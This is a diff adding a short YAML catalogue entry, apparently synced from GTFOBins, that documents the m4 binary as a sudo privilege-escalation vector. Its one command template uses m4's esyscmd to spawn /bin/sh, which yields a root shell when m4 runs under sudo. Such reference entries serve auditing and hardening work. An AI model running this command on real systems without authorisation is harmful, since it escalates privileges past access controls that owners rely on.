@@ -1,0 +1,24 @@
+id: gtfobins/m4/shell/sudo
+type: binary
+platform: linux
+name: m4
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4
+references:
+- https://gtfobins.github.io/gtfobins/m4/
+tags:
+- linux
+- unix
+- gtfobins
